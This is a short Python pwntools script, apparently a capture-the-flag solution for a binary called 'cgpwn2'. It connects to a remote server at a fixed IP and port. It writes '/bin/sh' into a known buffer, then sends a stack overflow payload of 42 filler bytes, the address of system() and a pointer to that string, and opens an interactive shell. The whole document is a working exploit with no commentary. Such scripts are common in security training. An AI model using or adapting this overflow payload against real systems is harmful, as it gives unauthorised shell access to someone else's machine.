
from pwn import *

# r = process('./cgpwn2')
r = remote('111.198.29.45',52402)

name = 0x0804A080
system = 0x8048420

r.recvuntil('name\n')
r.sendline(b'/bin/sh\x00')
r.recvuntil('here:\n')

p = b'A' * 42
p += p32(system)
p += p32(0xAAAAAAAA)
p += p32(name)

r.sendline(p)

r.interactive()
